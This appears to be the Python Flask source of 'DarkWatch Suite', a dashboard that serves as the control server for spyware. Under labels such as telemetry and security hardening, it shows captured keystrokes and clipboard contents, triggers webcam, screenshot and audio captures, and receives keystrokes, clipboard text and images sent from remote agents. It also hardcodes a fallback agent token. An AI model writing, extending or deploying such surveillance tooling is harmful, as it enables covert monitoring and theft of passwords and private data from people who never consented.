"""
===================================================================
Project: DarkWatch Suite - Web Dashboard
Description: Modern REST API backend and Flask web server with
             fail-closed global authentication, rate limiting,
             security headers, scrypt password hashing,
             path traversal defense, and live intelligence telemetry.
===================================================================
"""

import os
import re
import time
import json
import hmac
import secrets
import threading
from functools import wraps
from datetime import datetime, timedelta
from werkzeug.security import generate_password_hash, check_password_hash
from werkzeug.utils import secure_filename
from flask import Flask, render_template, jsonify, send_from_directory, request, session, redirect, url_for


class WebDashboard:
    def __init__(self, engine, config_path="config.json"):
        self.engine = engine
        self.config_path = config_path
        self.app = Flask(__name__, template_folder="templates", static_folder="static")
        self.app.config["TEMPLATES_AUTO_RELOAD"] = True
        self.app.config["SEND_FILE_MAX_AGE_DEFAULT"] = 0

        # Session Cookie Hardening (HttpOnly, SameSite, Lifetime)
        self.app.config["SESSION_COOKIE_HTTPONLY"] = True
        self.app.config["SESSION_COOKIE_SAMESITE"] = "Lax"
        self.app.config["PERMANENT_SESSION_LIFETIME"] = timedelta(hours=12)

        # In-Memory Rate Limiting Storage: IP -> [timestamp, timestamp, ...]
        self.failed_login_attempts = {}
        self.rate_limit_lock = threading.Lock()

        # Remote Endpoint Telemetry Registry: device_id -> Analyzed Telemetry Packet
        self.endpoint_telemetry = {}
        self.agent_token = os.environ.get("DARKWATCH_AGENT_TOKEN", "DarkWatch-Telemetry-Key-2026")

        # Load session secret securely: Environment variable -> Config -> Cryptographic Random
        dashboard_cfg = self.engine.config.get("dashboard", {})
        self.app.secret_key = (
            os.environ.get("DARKWATCH_SESSION_SECRET")
            or dashboard_cfg.get("session_secret")
            or secrets.token_hex(32)
        )

        # Disable noisy default logging
        import logging
        log = logging.getLogger('werkzeug')
        log.setLevel(logging.ERROR)

        self.setup_middleware()
        self.setup_routes()

    def check_rate_limit(self, ip: str, max_attempts=5, window_seconds=300) -> bool:
        """Rate limit checker: returns True if client exceeded max failed attempts."""
        with self.rate_limit_lock:
            now = time.time()
            attempts = [t for t in self.failed_login_attempts.get(ip, []) if now - t < window_seconds]
            self.failed_login_attempts[ip] = attempts
            return len(attempts) >= max_attempts

    def record_failed_attempt(self, ip: str):
        """Track a failed authentication attempt."""
        with self.rate_limit_lock:
            now = time.time()
            if ip not in self.failed_login_attempts:
                self.failed_login_attempts[ip] = []
            self.failed_login_attempts[ip].append(now)

    def clear_failed_attempts(self, ip: str):
        """Clear failed attempts upon successful login."""
        with self.rate_limit_lock:
            self.failed_login_attempts.pop(ip, None)

    def setup_middleware(self):
        """Global fail-closed authentication middleware, security headers, and error handlers."""
        PUBLIC_ENDPOINTS = {"/login", "/favicon.ico"}

        @self.app.before_request
        def enforce_global_authentication():
            # Allow static assets
            if request.path.startswith("/static/"):
                return None
            # Allow endpoint agent ingestion authenticated via X-Agent-Token
            if request.path in ("/api/telemetry/ingest", "/api/telemetry/data", "/api/telemetry/media"):
                token = request.headers.get("X-Agent-Token", "")
                if not token or not hmac.compare_digest(token, self.agent_token):
                    return jsonify({"error": "Unauthorized endpoint agent token"}), 401
                return None
            # Allow whitelisted public endpoints
            if request.path in PUBLIC_ENDPOINTS:
                return None
            # Enforce authentication on all other endpoints
            if self.is_auth_enabled() and not session.get("logged_in"):
                if request.path.startswith("/api/"):
                    return jsonify({"error": "Unauthorized. Please login first.", "auth_required": True}), 401
                return redirect(url_for("login"))
            return None

        @self.app.after_request
        def set_security_headers(response):
            # Category 8: Standard Enterprise Security Headers
            response.headers["X-Frame-Options"] = "DENY"
            response.headers["X-Content-Type-Options"] = "nosniff"
            response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
            response.headers["Content-Security-Policy"] = (
                "default-src 'self'; "
                "script-src 'self' https://cdn.jsdelivr.net https://cdnjs.cloudflare.com 'unsafe-inline'; "
                "style-src 'self' https://fonts.googleapis.com https://cdnjs.cloudflare.com 'unsafe-inline'; "
                "font-src 'self' https://fonts.gstatic.com https://cdnjs.cloudflare.com data:; "
                "img-src 'self' data:; "
                "media-src 'self'; "
                "connect-src 'self';"
            )
            if request.is_secure:
                response.headers["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains"
            return response

        # Category 15: Global Error Handlers (Clean JSON, no stack trace exposure)
        @self.app.errorhandler(400)
        def handle_400(err):
            if request.path.startswith("/api/"):
                return jsonify({"error": "Bad request"}), 400
            return render_template("login.html", error="Bad request"), 400

        @self.app.errorhandler(404)
        def handle_404(err):
            if request.path.startswith("/api/"):
                return jsonify({"error": "Resource not found"}), 404
            return redirect("/")

        @self.app.errorhandler(500)
        def handle_500(err):
            if request.path.startswith("/api/"):
                return jsonify({"error": "Internal server error"}), 500
            return render_template("login.html", error="Internal server error"), 500

    def is_auth_enabled(self):
        env_auth = os.environ.get("DARKWATCH_AUTH_REQUIRED")
        if env_auth is not None:
            return env_auth.lower() in ("true", "1", "yes")
        return self.engine.config.get("dashboard", {}).get("auth_required", True)

    def get_admin_credentials(self):
        """Retrieve admin credentials prioritizing environment variables with scrypt hashing."""
        dashboard_cfg = self.engine.config.get("dashboard", {})
        valid_user = os.environ.get("DARKWATCH_ADMIN_USER") or dashboard_cfg.get("username", "admin")

        # Category 16: Check for scrypt password hash first
        pwd_hash = dashboard_cfg.get("password_hash")
        env_pass = os.environ.get("DARKWATCH_ADMIN_PASSWORD")
        raw_pass = dashboard_cfg.get("password")

        if env_pass:
            pwd_hash = generate_password_hash(env_pass, method="scrypt")
        elif not pwd_hash:
            if raw_pass:
                # Migrate plaintext password to scrypt hash immediately
                pwd_hash = generate_password_hash(raw_pass, method="scrypt")
                dashboard_cfg["password_hash"] = pwd_hash
                dashboard_cfg.pop("password", None)
                self.engine.config["dashboard"] = dashboard_cfg
                try:
                    with open(self.config_path, "w", encoding="utf-8") as f:
                        json.dump(self.engine.config, f, indent=2)
                except Exception:
                    pass
            else:
                # Generate a secure one-time initial password and hash it
                initial_pass = secrets.token_urlsafe(16)
                pwd_hash = generate_password_hash(initial_pass, method="scrypt")
                dashboard_cfg["password_hash"] = pwd_hash
                self.engine.config["dashboard"] = dashboard_cfg
                try:
                    with open(self.config_path, "w", encoding="utf-8") as f:
                        json.dump(self.engine.config, f, indent=2)
                except Exception:
                    pass
                print(f"\n[!] SECURITY: No admin password configured. Generated initial admin password: {initial_pass}\n")

        return valid_user, pwd_hash

    def verify_password(self, provided_password: str, stored_hash: str) -> bool:
        """Verify user password against scrypt hash safely."""
        if not provided_password or not stored_hash:
            return False
        try:
            return check_password_hash(stored_hash, provided_password)
        except Exception:
            return False

    def login_required(self, f):
        @wraps(f)
        def decorated_function(*args, **kwargs):
            if self.is_auth_enabled() and not session.get("logged_in"):
                if request.path.startswith("/api/"):
                    return jsonify({"error": "Unauthorized. Please login first.", "auth_required": True}), 401
                return redirect(url_for("login"))
            return f(*args, **kwargs)
        return decorated_function

    def setup_routes(self):
        @self.app.route("/login", methods=["GET", "POST"])
        def login():
            valid_user, pwd_hash = self.get_admin_credentials()
            client_ip = request.remote_addr or "127.0.0.1"

            if request.method == "POST":
                # Category 10: Rate Limiting
                if self.check_rate_limit(client_ip):
                    if request.is_json:
                        return jsonify({"success": False, "error": "Too many failed attempts. Please wait 5 minutes."}), 429
                    return render_template("login.html", error="Too many failed attempts. Please wait 5 minutes."), 429

                # Handle JSON or Form POST safely
                if request.is_json:
                    data = request.get_json() or {}
                    username = str(data.get("username") or "").strip()
                    password = str(data.get("password") or "").strip()
                else:
                    username = str(request.form.get("username") or "").strip()
                    password = str(request.form.get("password") or "").strip()

                if hmac.compare_digest(username, valid_user) and self.verify_password(password, pwd_hash):
                    self.clear_failed_attempts(client_ip)
                    # Category 3: Prevent session fixation
                    session.clear()
                    session["logged_in"] = True
                    session["username"] = username
                    session.permanent = True
                    if request.is_json:
                        return jsonify({"success": True, "redirect": "/"})
                    return redirect("/")
                else:
                    self.record_failed_attempt(client_ip)
                    if request.is_json:
                        return jsonify({"success": False, "error": "Invalid username or password"}), 401
                    return render_template("login.html", error="Invalid username or password")

            if session.get("logged_in"):
                return redirect("/")
            return render_template("login.html")

        @self.app.route("/favicon.ico")
        def favicon():
            return send_from_directory(os.path.join(self.app.root_path, "static", "img"), "favicon.ico", mimetype="image/vnd.microsoft.icon")

        @self.app.route("/logout")
        def logout():
            session.clear()
            resp = redirect(url_for("login"))
            cookie_name = self.app.config.get("SESSION_COOKIE_NAME", "session")
            resp.delete_cookie(cookie_name)
            return resp

        @self.app.route("/")
        @self.login_required
        def index():
            return render_template("index.html", author=self.engine.config.get("author", "DarkWatch Core"))

        @self.app.route("/api/stats")
        @self.login_required
        def get_stats():
            return jsonify(self.engine.get_stats())

        @self.app.route("/api/modules")
        @self.login_required
        def get_modules():
            return jsonify(self.engine.modules_state)

        @self.app.route("/api/modules/toggle", methods=["POST"])
        @self.login_required
        def toggle_module():
            data = request.get_json() or {}
            module_name = data.get("module")
            target_state = data.get("state")

            if not module_name:
                return jsonify({"error": "Module name required"}), 400

            new_state = self.engine.toggle_module(module_name, target_state)
            if new_state is None:
                return jsonify({"error": f"Unknown module '{module_name}'"}), 400

            return jsonify({
                "success": True,
                "module": module_name,
                "state": new_state,
                "modules": self.engine.modules_state
            })

        @self.app.route("/api/records/clear", methods=["POST"])
        @self.login_required
        def clear_records():
            data = request.get_json() or {}
            target = data.get("target", "all")
            success = self.engine.clear_records(target=target)
            return jsonify({
                "success": success,
                "target": target,
                "stats": self.engine.get_stats()
            })

        @self.app.route("/api/dlp/status")
        @self.login_required
        def get_dlp_status():
            if getattr(self.engine, "dlp_scanner", None):
                return jsonify(self.engine.dlp_scanner.get_dashboard_alert_status())
            return jsonify({"unread_count": 0, "total_alerts": 0, "alerts": []})

        @self.app.route("/api/dlp/mark_read", methods=["POST"])
        @self.login_required
        def mark_dlp_read():
            if getattr(self.engine, "dlp_scanner", None):
                self.engine.dlp_scanner.mark_all_read()
            return jsonify({"success": True})

        @self.app.route("/api/dlp/clear", methods=["POST"])
        @self.login_required
        def clear_dlp_alert():
            if getattr(self.engine, "dlp_scanner", None):
                self.engine.dlp_scanner.clear_alerts()
            return jsonify({"success": True, "message": "All DLP alerts cleared."})

        @self.app.route("/api/activity/usage")
        @self.login_required
        def get_activity_usage():
            if hasattr(self.engine, "activity_tracker") and self.engine.activity_tracker:
                return jsonify({
                    "usage": self.engine.activity_tracker.get_app_usage(),
                    "timeline": self.engine.activity_tracker.get_timeline(30),
                    "current": self.engine.activity_tracker.get_current_focus(),
                    "chartjs": self.engine.activity_tracker.get_chartjs_payload()
                })
            return jsonify({
                "usage": {},
                "timeline": [],
                "current": {"app": "none", "title": "Inactive", "tab": ""},
                "chartjs": {"labels": [], "datasets": []}
            })

        @self.app.route("/api/logs/keystrokes")
        @self.login_required
        def get_keystrokes():
            path = self.engine.keys_log_path
            content = ""
            if os.path.exists(path):
                try:
                    with open(path, "r", encoding="utf-8", errors="ignore") as f:
                        content = f.read()
                except Exception as e:
                    content = f"Error reading log file: {e}"
            return jsonify({"content": content or "No keystrokes recorded yet."})

        @self.app.route("/api/logs/clipboard")
        @self.login_required
        def get_clipboard():
            path = self.engine.clipboard_log_path
            content = ""
            if os.path.exists(path):
                try:
                    with open(path, "r", encoding="utf-8", errors="ignore") as f:
                        content = f.read()
                except Exception as e:
                    content = f"Error reading clipboard log: {e}"
            return jsonify({"content": content or "No clipboard entries captured yet."})

        @self.app.route("/api/logs/system")
        @self.login_required
        def get_system_info():
            path = self.engine.system_info_path
            content = ""
            if os.path.exists(path):
                try:
                    with open(path, "r", encoding="utf-8", errors="ignore") as f:
                        content = f.read()
                except Exception as e:
                    content = f"Error reading system info: {e}"
            return jsonify({"content": content or "System information loading..."})

        @self.app.route("/api/gallery/<category>")
        @self.login_required
        def get_gallery(category):
            valid_dirs = {
                "screenshots": self.engine.screenshots_dir,
                "webcam": self.engine.webcam_dir,
                "audio": self.engine.audio_dir
            }
            if category not in valid_dirs:
                return jsonify({"error": "Invalid category"}), 400

            target_dir = valid_dirs[category]
            files = []
            if os.path.exists(target_dir):
                for fname in sorted(os.listdir(target_dir), reverse=True):
                    fpath = os.path.join(target_dir, fname)
                    if os.path.isfile(fpath):
                        files.append({
                            "filename": fname,
                            "size_kb": round(os.path.getsize(fpath) / 1024, 1),
                            "url": f"/api/media/{category}/{fname}"
                        })
            return jsonify({"category": category, "files": files})

        # Category 4: Access Control & Path Traversal Mitigation
        @self.app.route("/api/media/<category>/<filename>")
        @self.login_required
        def serve_media(category, filename):
            valid_dirs = {
                "screenshots": self.engine.screenshots_dir,
                "webcam": self.engine.webcam_dir,
                "audio": self.engine.audio_dir
            }
            if category not in valid_dirs:
                return jsonify({"error": "Invalid category"}), 400

            clean_name = secure_filename(os.path.basename(filename))
            if not clean_name or not re.match(r"^[a-zA-Z0-9_.-]+$", clean_name):
                return jsonify({"error": "Invalid file name"}), 400

            target_dir = os.path.abspath(valid_dirs[category])
            file_path = os.path.abspath(os.path.join(target_dir, clean_name))

            if not file_path.startswith(target_dir) or not os.path.isfile(file_path):
                return jsonify({"error": "File not found"}), 404

            return send_from_directory(target_dir, clean_name)

        @self.app.route("/api/trigger/<action>", methods=["POST"])
        @self.login_required
        def trigger_action(action):
            if action == "screenshot":
                res = self.engine.trigger_screenshot()
                return jsonify({"success": bool(res), "file": res})
            elif action == "webcam":
                res = self.engine.trigger_webcam()
                return jsonify({"success": bool(res), "file": res})
            elif action == "audio":
                res = self.engine.trigger_audio()
                return jsonify({"success": bool(res), "file": res})
            elif action == "encrypt":
                res = self.engine.encrypt_logs()
                return jsonify({"success": res})
            return jsonify({"error": f"Unknown trigger action '{action}'"}), 400

        @self.app.route("/api/settings", methods=["GET", "POST"])
        @self.login_required
        def settings():
            dashboard_cfg = self.engine.config.get("dashboard", {})
            if request.method == "POST":
                data = request.get_json() or {}
                new_project_name = data.get("project_name", "").strip()
                new_username = data.get("username", "").strip()
                new_password = data.get("password", "").strip()
                new_interval = data.get("capture_interval_seconds")

                if new_project_name:
                    self.engine.config["project_name"] = new_project_name
                if new_username:
                    dashboard_cfg["username"] = new_username
                if new_password:
                    # Category 16: Store scrypt hash, never plaintext password
                    dashboard_cfg["password_hash"] = generate_password_hash(new_password, method="scrypt")
                    dashboard_cfg.pop("password", None)
                if new_interval is not None:
                    try:
                        val = max(5, int(new_interval))
                        self.engine.config["capture_interval_seconds"] = val
                    except (ValueError, TypeError):
                        pass

                self.engine.config["dashboard"] = dashboard_cfg
                try:
                    with open(self.config_path, "w", encoding="utf-8") as f:
                        json.dump(self.engine.config, f, indent=2)
                    return jsonify({"success": True, "message": "Settings saved successfully!"})
                except Exception as e:
                    return jsonify({"success": False, "error": str(e)}), 500

            return jsonify({
                "project_name": self.engine.config.get("project_name", "DarkWatch Intelligence Suite"),
                "username": dashboard_cfg.get("username", "admin"),
                "capture_interval_seconds": self.engine.config.get("capture_interval_seconds", 30)
            })

        # =============================================================
        # REMOTE ENDPOINT TELEMETRY & AI SYSTEMS ANALYST ROUTES
        # =============================================================
        @self.app.route("/api/telemetry/ingest", methods=["POST"])
        def ingest_telemetry():
            """Ingest structured JSON telemetry from authorized remote endpoint agent."""
            try:
                packet = request.get_json(silent=True)
                if not packet or not isinstance(packet, dict):
                    return jsonify({"error": "Invalid or missing JSON payload"}), 400

                dev_info = packet.get("device_identification", {})
                device_id = str(dev_info.get("device_id") or dev_info.get("hostname") or "node-unknown").strip()

                # Run AI Systems Administrator & Security Evaluation
                analysis = self.analyze_telemetry_packet(packet)
                packet["analysis"] = analysis
                packet["last_seen"] = time.time()
                packet["last_seen_str"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

                self.endpoint_telemetry[device_id] = packet

                return jsonify({
                    "success": True,
                    "device_id": device_id,
                    "status": analysis["status"],
                    "warnings": analysis["warning_count"]
                })
            except Exception as e:
                return jsonify({"error": f"Failed to ingest telemetry: {str(e)}"}), 500

        @self.app.route("/api/telemetry/endpoints", methods=["GET"])
        @self.login_required
        def get_endpoints():
            """List all reporting endpoint devices, metrics, and health evaluation status."""
            devices = []
            now = time.time()
            for dev_id, data in self.endpoint_telemetry.items():
                last_seen_ts = data.get("last_seen", 0)
                is_online = (now - last_seen_ts) < 45
                dev_copy = dict(data)
                dev_copy["is_online"] = is_online
                devices.append(dev_copy)

            devices.sort(key=lambda x: (x.get("is_online", False), x.get("last_seen", 0)), reverse=True)
            return jsonify({
                "endpoints": devices,
                "total_count": len(devices),
                "online_count": sum(1 for d in devices if d.get("is_online")),
                "warning_count": sum(1 for d in devices if d.get("analysis", {}).get("status") in ("WARNING", "CRITICAL"))
            })

        @self.app.route("/api/telemetry/endpoints/<device_id>", methods=["DELETE"])
        @self.login_required
        def remove_endpoint(device_id):
            """Remove an endpoint node from registry."""
            if device_id in self.endpoint_telemetry:
                del self.endpoint_telemetry[device_id]
                return jsonify({"success": True, "message": f"Endpoint '{device_id}' removed from registry."})
            return jsonify({"error": "Endpoint not found"}), 404

        @self.app.route("/api/telemetry/data", methods=["POST"])
        def ingest_telemetry_data():
            """Ingest buffered text data (keystrokes, clipboard, DLP flags) from remote agent."""
            try:
                payload = request.get_json(silent=True)
                if not payload or not isinstance(payload, dict):
                    return jsonify({"error": "Invalid or missing JSON payload"}), 400

                device_id = str(payload.get("device_id") or "unknown-node").strip()
                # Sanitize device_id to prevent path traversal
                clean_device_id = re.sub(r'[^a-zA-Z0-9_.-]', '_', device_id)

                remote_base = os.path.join(self.engine.log_dir, "remote", clean_device_id)
                os.makedirs(remote_base, exist_ok=True)

                # Store keystrokes
                keystrokes_text = payload.get("keystrokes", "")
                if keystrokes_text:
                    keys_file = os.path.join(remote_base, "keystrokes.txt")
                    with open(keys_file, "a", encoding="utf-8") as f:
                        f.write(keystrokes_text)

                # Store clipboard
                clipboard_text = payload.get("clipboard", "")
                if clipboard_text:
                    clip_file = os.path.join(remote_base, "clipboard.txt")
                    with open(clip_file, "a", encoding="utf-8") as f:
                        f.write(clipboard_text)

                # Update registry metadata
                if clean_device_id in self.endpoint_telemetry:
                    self.endpoint_telemetry[clean_device_id]["last_data_sync"] = time.time()
                    self.endpoint_telemetry[clean_device_id]["has_remote_logs"] = True

                return jsonify({"success": True, "device_id": clean_device_id})
            except Exception as e:
                return jsonify({"error": f"Failed to ingest data: {str(e)}"}), 500

        @self.app.route("/api/telemetry/media", methods=["POST"])
        def ingest_telemetry_media():
            """Ingest binary media (screenshot/webcam) from remote agent."""
            try:
                device_id = request.form.get("device_id", "unknown-node").strip()
                category = request.form.get("category", "screenshots").strip()

                if category not in ("screenshots", "webcam"):
                    return jsonify({"error": "Invalid media category"}), 400

                if "file" not in request.files:
                    return jsonify({"error": "No file part in request"}), 400

                file_obj = request.files["file"]
                if not file_obj or file_obj.filename == "":
                    return jsonify({"error": "No file selected"}), 400

                clean_device_id = re.sub(r'[^a-zA-Z0-9_.-]', '_', device_id)
                target_dir = os.path.join(self.engine.log_dir, "remote", clean_device_id, category)
                os.makedirs(target_dir, exist_ok=True)

                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                orig_ext = os.path.splitext(secure_filename(file_obj.filename))[1] or ".png"
                save_filename = f"{category}_{timestamp}{orig_ext}"
                save_path = os.path.join(target_dir, save_filename)

                file_obj.save(save_path)

                # Auto-prune per device media (keep latest 100)
                try:
                    files = [os.path.join(target_dir, f) for f in os.listdir(target_dir) if os.path.isfile(os.path.join(target_dir, f))]
                    if len(files) > 100:
                        files.sort(key=os.path.getmtime)
                        for old_file in files[:-100]:
                            try:
                                os.remove(old_file)
                            except Exception:
                                pass
                except Exception:
                    pass

                return jsonify({"success": True, "filename": save_filename})
            except Exception as e:
                return jsonify({"error": f"Failed to save media: {str(e)}"}), 500

        @self.app.route("/api/telemetry/logs/<device_id>/<log_type>", methods=["GET"])
        @self.login_required
        def get_remote_logs(device_id, log_type):
            """Read remote device keystrokes or clipboard logs."""
            if log_type not in ("keystrokes", "clipboard"):
                return jsonify({"error": "Invalid log type"}), 400

            clean_device_id = re.sub(r'[^a-zA-Z0-9_.-]', '_', device_id)
            filename = f"{log_type}.txt"
            log_path = os.path.abspath(os.path.join(self.engine.log_dir, "remote", clean_device_id, filename))

            expected_base = os.path.abspath(os.path.join(self.engine.log_dir, "remote"))
            if not log_path.startswith(expected_base) or not os.path.isfile(log_path):
                return jsonify({"content": f"No {log_type} recorded yet for this endpoint."})

            try:
                with open(log_path, "r", encoding="utf-8", errors="ignore") as f:
                    content = f.read()
                return jsonify({"content": content or f"No {log_type} recorded yet."})
            except Exception as e:
                return jsonify({"content": f"Error reading log: {str(e)}"})

        @self.app.route("/api/telemetry/gallery/<device_id>/<category>", methods=["GET"])
        @self.login_required
        def get_remote_gallery(device_id, category):
            """List remote device screenshots or webcam snaps."""
            if category not in ("screenshots", "webcam"):
                return jsonify({"error": "Invalid category"}), 400

            clean_device_id = re.sub(r'[^a-zA-Z0-9_.-]', '_', device_id)
            target_dir = os.path.abspath(os.path.join(self.engine.log_dir, "remote", clean_device_id, category))

            files = []
            if os.path.exists(target_dir):
                for fname in sorted(os.listdir(target_dir), reverse=True):
                    fpath = os.path.join(target_dir, fname)
                    if os.path.isfile(fpath):
                        files.append({
                            "filename": fname,
                            "size_kb": round(os.path.getsize(fpath) / 1024, 1),
                            "url": f"/api/telemetry/media/{clean_device_id}/{category}/{fname}"
                        })

            return jsonify({"category": category, "files": files, "device_id": clean_device_id})

        @self.app.route("/api/telemetry/media/<device_id>/<category>/<filename>", methods=["GET"])
        @self.login_required
        def serve_remote_media(device_id, category, filename):
            """Serve media captured by a remote agent."""
            if category not in ("screenshots", "webcam"):
                return jsonify({"error": "Invalid category"}), 400

            clean_device_id = re.sub(r'[^a-zA-Z0-9_.-]', '_', device_id)
            clean_name = secure_filename(os.path.basename(filename))
            if not clean_name:
                return jsonify({"error": "Invalid file name"}), 400

            target_dir = os.path.abspath(os.path.join(self.engine.log_dir, "remote", clean_device_id, category))
            file_path = os.path.abspath(os.path.join(target_dir, clean_name))

            if not file_path.startswith(target_dir) or not os.path.isfile(file_path):
                return jsonify({"error": "File not found"}), 404

            return send_from_directory(target_dir, clean_name)

    def analyze_telemetry_packet(self, packet: dict) -> dict:
        """
        AI Systems Administrator & Security Analyst Evaluation Engine.
        Reviews:
          1. DEVICE IDENTIFICATION (Hostname, OS, IP address)
          2. SYSTEM PERFORMANCE (CPU %, RAM %, remaining Disk)
          3. OPERATIONAL HEALTH (Active services, crashes, process count)
          4. SECURITY STATE (Authentication events, active network connections)
        Generates scannable operational summary & highlights warning thresholds.
        """
        dev_id = packet.get("device_identification", {})
        perf = packet.get("system_performance", {})
        health = packet.get("operational_health", {})
        sec = packet.get("security_state", {})

        hostname = dev_id.get("hostname", "Unknown-Host")
        os_version = f"{dev_id.get('os_name', '')} {dev_id.get('os_release', '')} ({dev_id.get('os_version', '')})".strip() or "Unknown OS"
        local_ip = dev_id.get("local_ip", "0.0.0.0")

        try:
            cpu_pct = float(perf.get("cpu_percent", 0.0))
        except (ValueError, TypeError):
            cpu_pct = 0.0

        try:
            ram_pct = float(perf.get("ram_percent", 0.0))
        except (ValueError, TypeError):
            ram_pct = 0.0

        try:
            disk_pct = float(perf.get("disk_percent", 0.0))
            disk_free_gb = float(perf.get("disk_free_gb", 0.0))
            disk_total_gb = float(perf.get("disk_total_gb", 0.0))
        except (ValueError, TypeError):
            disk_pct = disk_free_gb = disk_total_gb = 0.0

        warnings = []
        is_critical = False

        # Threshold Evaluations:
        if cpu_pct > 90.0:
            severity = "CRITICAL" if cpu_pct > 95.0 else "WARNING"
            warnings.append({
                "category": "PERFORMANCE",
                "severity": severity,
                "title": "High CPU Utilization",
                "message": f"CPU utilization is at {cpu_pct}%, exceeding safe operational threshold (90%)."
            })
            if cpu_pct > 95.0:
                is_critical = True

        if ram_pct > 85.0:
            severity = "CRITICAL" if ram_pct > 92.0 else "WARNING"
            warnings.append({
                "category": "PERFORMANCE",
                "severity": severity,
                "title": "High Memory Pressure",
                "message": f"RAM usage is at {ram_pct}%, exceeding 85% memory capacity limit."
            })
            if ram_pct > 92.0:
                is_critical = True

        if disk_pct > 85.0:
            warnings.append({
                "category": "STORAGE",
                "severity": "WARNING",
                "title": "Low Disk Storage",
                "message": f"System drive capacity is at {disk_pct}%. Only {disk_free_gb} GB remaining of {disk_total_gb} GB."
            })

        # Security & Health checks
        established_conns = sec.get("total_established", len(sec.get("active_connections", [])))
        if established_conns > 120:
            warnings.append({
                "category": "SECURITY",
                "severity": "WARNING",
                "title": "Abnormal Network Sockets",
                "message": f"High number of active established TCP connections detected ({established_conns} sockets)."
            })

        # Determine overall machine status
        if is_critical:
            status = "CRITICAL"
        elif warnings:
            status = "WARNING"
        else:
            status = "HEALTHY"

        # Executive Scannable AI Assessment Summary
        summary_text = (
            f"Endpoint [{hostname}] ({local_ip}, {os_version}) is currently {status}. "
            f"CPU: {cpu_pct}%, RAM: {ram_pct}%, Remaining Disk: {disk_free_gb} GB ({round(100 - disk_pct, 1)}% free). "
            f"Active processes: {health.get('total_processes', 'N/A')}, Established TCP connections: {established_conns}. "
        )
        if warnings:
            summary_text += f"Alert: {len(warnings)} threshold warning(s) flagged."
        else:
            summary_text += "Nominal operation: all monitored parameters within safe boundaries."

        return {
            "status": status,
            "warnings": warnings,
            "warning_count": len(warnings),
            "summary": summary_text,
            "evaluated_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }


    def run(self, host="127.0.0.1", port=5000):
        print(f"[*] Starting DarkWatch Dashboard at http://{host}:{port}")
        self.app.run(host=host, port=port, debug=False, use_reloader=False)
